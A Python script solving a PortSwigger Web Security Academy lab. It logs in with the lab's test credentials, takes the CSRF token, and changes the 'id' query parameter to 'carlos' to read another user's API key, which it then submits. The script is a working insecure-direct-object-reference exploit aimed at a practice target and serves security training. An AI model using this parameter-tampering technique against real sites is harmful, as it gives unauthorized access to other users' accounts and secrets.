'''This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter
'''

import requests
from bs4 import BeautifulSoup
import re

lab_id = '0a3200b203c9049f832a101d00f400d0' # change according to generated lab_id
s = requests.Session()


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    token = token_extract(r.text) # login csrf token

    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }
    r2 = s.post(uri, data=data)

    # When logged in, use the id parmeter to get the carlos account information
    uri = f"https://{lab_id}.web-security-academy.net/my-account?id=carlos"
    r3 = s.get(uri)
    # extract the API key from the response
    if "API" in r3.text:
        key = re.search(r'API Key is: (\w+)', r3.text)
        print(f'Submitting key: {key[1]}')

    # Submit the API key to finish the lab
    uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
    data = { 'answer' : key[1] }
    r4 = requests.post(uri, data=data)
    print('finished')

if __name__ == '__main__':
    main()